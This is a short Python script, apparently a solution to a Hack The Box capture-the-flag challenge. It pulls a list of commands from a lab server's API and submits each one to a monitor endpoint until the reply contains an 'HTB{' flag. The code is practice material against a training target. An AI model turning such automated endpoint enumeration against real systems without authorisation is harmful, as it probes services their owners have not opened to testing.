import requests

base_url = 'http://94.237.55.12:58866'
options_response = requests.get(f'{base_url}/api/options')
options = options_response.json()

for num, commands in options["allPossibleCommands"].items():
    for command in commands:
        print(command)
        response = requests.post(
            f'{base_url}/api/monitor',
            json={'command': command},
            headers={'Content-Type': 'application/json'}
        )
        data = response.json()
        print(data['message'])
        if 'HTB{' in data['message']:
            print("Flag found:", data['message'])
            break